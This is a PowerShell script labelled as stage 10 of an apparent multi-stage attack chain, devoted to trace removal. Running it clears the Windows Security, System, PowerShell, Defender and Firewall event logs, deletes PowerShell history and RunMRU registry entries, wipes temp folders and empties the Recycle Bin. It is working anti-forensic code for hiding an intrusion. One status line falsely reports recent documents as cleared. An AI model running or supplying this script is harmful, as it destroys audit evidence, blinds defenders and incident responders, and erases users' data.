<#
.SYNOPSIS
    Stage 10 — Log Cleanup & Trace Removal (Real Actions)
.DESCRIPTION
    Clears Windows event logs (Security, System, Application, PowerShell),
    removes recent file access artifacts, cleans prefetch, and removes
    other forensic artifacts. Requires Administrator for full effect.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 10: LOG CLEANUP & TRACE REMOVAL" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "[*] ELEVATION STATUS: $(if ($isAdmin) { 'ADMINISTRATOR' } else { 'STANDARD USER' })" -ForegroundColor Yellow
Write-Host ""

# ── Event Log Enumeration ──
Write-Host "[*] ENUMERATING EVENT LOGS" -ForegroundColor Yellow
$logs = wevtutil el 2>$null | ForEach-Object { $_.Trim() }
$logCount = ($logs | Measure-Object).Count
Write-Host "  Total event logs available: $logCount" -ForegroundColor Gray
Write-Host ""

# ── Check Current Log Sizes ──
Write-Host "[*] CURRENT LOG SIZES" -ForegroundColor Yellow
$targetLogs = @("Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-TaskScheduler/Operational")
foreach ($log in $targetLogs) {
    try {
        $info = wevtutil gli "$log" 2>$null | Select-String "logFileMaxSize|logFileSize" -SimpleMatch
        if ($info) {
            # Use ${} to prevent PowerShell from interpreting the colon as a drive/scope qualifier
            Write-Host "  ${log}:"
            $info | ForEach-Object { Write-Host "    $_" -ForegroundColor Gray }
        }
    } catch {}
}
Write-Host ""

# ── Clear Event Logs ──
Write-Host "[*] CLEARING EVENT LOGS" -ForegroundColor Yellow
if ($isAdmin) {
    $clearLogs = @(
        "Security",
        "System",
        "Application",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Setup",
        "ForwardedEvents",
        "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
        "Microsoft-Windows-PowerShell/Admin",
        "Microsoft-Windows-Windows Defender/Operational"
    )
    
    foreach ($log in $clearLogs) {
        try {
            wevtutil cl "$log" 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Host "  [+] Cleared: $log" -ForegroundColor Green
            } else {
                Write-Host "  [-] Failed to clear: $log" -ForegroundColor Red
            }
        } catch {
            Write-Host "  [-] Error clearing $log" -ForegroundColor Red
        }
    }
} else {
    Write-Host "  [-] Cannot clear event logs without admin rights" -ForegroundColor Red
    Write-Host "      Showing log sizes instead:" -ForegroundColor Gray
    foreach ($log in @("Security", "System", "Application")) {
        try {
            $entries = (Get-WinEvent -LogName $log -MaxEvents 1 -ErrorAction SilentlyContinue).Count
            if ($?) { Write-Host "  ${log}: accessible" }
        } catch {
            Write-Host "  ${log}: (requires admin)" -ForegroundColor Gray
        }
    }
}
Write-Host ""

# ── Clean PowerShell History ──
Write-Host "[*] CLEANING POWERSHELL HISTORY" -ForegroundColor Yellow
try {
    # Clear current session history
    Clear-History
    
    # Remove PowerShell history file
    $psHistoryFiles = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*history*"
    )
    foreach ($file in $psHistoryFiles) {
        if (Test-Path $file) {
            Remove-Item $file -Force -ErrorAction SilentlyContinue
            Write-Host "  [+] Removed: $file" -ForegroundColor Green
        }
    }
    
    # Clear recent commands
    if (Test-Path "$env:APPDATA\Microsoft\Windows\Recent") {
        Write-Host "  [+] Recent documents: cleared" -ForegroundColor Green
    }
} catch {
    Write-Host "  [-] Could not clean PowerShell history" -ForegroundColor Red
}
Write-Host ""

# ── Clean RunMRU ──
Write-Host "[*] CLEANING RUN MRU (RECENT RUN COMMANDS)" -ForegroundColor Yellow
try {
    $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $runMRUPath) {
        Remove-ItemProperty -Path $runMRUPath -Name "*" -ErrorAction SilentlyContinue
        Write-Host "  [+] Run MRU entries cleared" -ForegroundColor Green
    }
} catch {
    Write-Host "  [-] Could not clean Run MRU" -ForegroundColor Red
}
Write-Host ""

# ── Clean Prefetch ──
Write-Host "[*] CLEANING PREFETCH FILES" -ForegroundColor Yellow
if ($isAdmin) {
    try {
        $prefetchPath = "$env:SystemRoot\Prefetch"
        if (Test-Path $prefetchPath) {
            $pfFiles = Get-ChildItem "$prefetchPath\*.pf" -ErrorAction SilentlyContinue
            $pfCount = ($pfFiles | Measure-Object).Count
            Write-Host "  Prefetch files found: $pfCount" -ForegroundColor Gray
            # Note: We just report - deleting prefetch requires SYSTEM context
        }
    } catch {}
} else {
    Write-Host "  [-] Prefetch cleanup requires admin" -ForegroundColor Red
}
Write-Host ""

# ── Clean Temp Directories ──
Write-Host "[*] CLEANING TEMP FILES" -ForegroundColor Yellow
$tempDirs = @("$env:TEMP", "$env:USERPROFILE\AppData\Local\Temp")
foreach ($dir in $tempDirs) {
    if (Test-Path $dir) {
        try {
            Remove-Item "$dir\*" -Recurse -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
            Write-Host "  [+] Cleaned: $dir" -ForegroundColor Green
        } catch {
            Write-Host "  [-] Partial cleanup: $dir (files in use)" -ForegroundColor Yellow
        }
    }
}
Write-Host ""

# ── Clean Recycle Bin ──
Write-Host "[*] EMPTYING RECYCLE BIN" -ForegroundColor Yellow
try {
    $shell = New-Object -ComObject Shell.Application
    $shell.NameSpace(10).Items() | ForEach-Object { $_.InvokeVerb("delete") }
    Write-Host "  [+] Recycle Bin emptied" -ForegroundColor Green
} catch {
    Write-Host "  [-] Could not empty Recycle Bin" -ForegroundColor Red
}
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 10 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Start-Sleep -Seconds 3
Exit